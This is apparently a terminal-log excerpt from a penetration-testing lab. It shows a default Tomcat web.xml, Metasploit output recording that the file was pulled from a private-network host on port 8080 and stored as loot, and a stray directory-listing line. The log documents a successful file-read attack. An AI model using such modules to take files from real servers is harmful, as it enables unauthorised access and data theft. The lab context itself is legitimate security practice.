  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                  	http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
 	Welcome to Tomcat
  </description>

</web-app>

[+] 192.168.1.86:8080 - /home/kali/.msf4/loot/20231010140213_default_192.168.1.86_WEBINFweb.xml_355607.txt
[*] Auxiliary module execution completed

   lrwxrwxrwx   1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server





